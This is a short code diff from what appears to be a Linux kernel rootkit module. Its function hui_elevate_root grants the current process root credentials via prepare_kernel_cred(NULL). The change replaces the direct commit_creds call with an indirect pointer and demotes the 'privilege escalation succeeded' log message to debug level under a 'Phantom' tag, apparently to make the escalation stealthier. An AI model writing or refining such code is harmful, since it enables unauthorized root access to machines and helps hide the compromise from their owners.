@@ -6,8 +6,8 @@ void hui_elevate_root(void) {
     if (!current->mm) return;
     new_cred = prepare_kernel_cred(NULL);
     if (new_cred) {
-        commit_creds(new_cred);
-        pr_info("HUI: [%s] 提权成功！\n", current->comm);
+        hui_commit_creds_ptr(new_cred);
+        pr_debug("HuiJuiPhantom: [%s] 提权成功！\n", current->comm);
     }
 }
 
